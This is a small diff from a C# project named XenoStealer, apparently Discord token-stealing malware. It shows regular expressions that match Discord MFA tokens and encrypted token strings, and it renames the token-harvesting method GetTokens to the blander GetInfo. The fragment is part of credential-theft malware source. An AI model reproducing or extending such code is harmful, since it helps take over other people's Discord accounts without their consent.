@@ -18,7 +18,7 @@ namespace XenoStealer
         private static Regex NewRegex = new Regex(@"mfa\.[\w-]{84}", RegexOptions.Compiled);
         private static Regex EncryptedRegex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);
 
-        public static DiscordUserData[] GetTokens() 
+        public static DiscordUserData[] GetInfo() 
         {
             HashSet<string> tokens = new HashSet<string>();
 
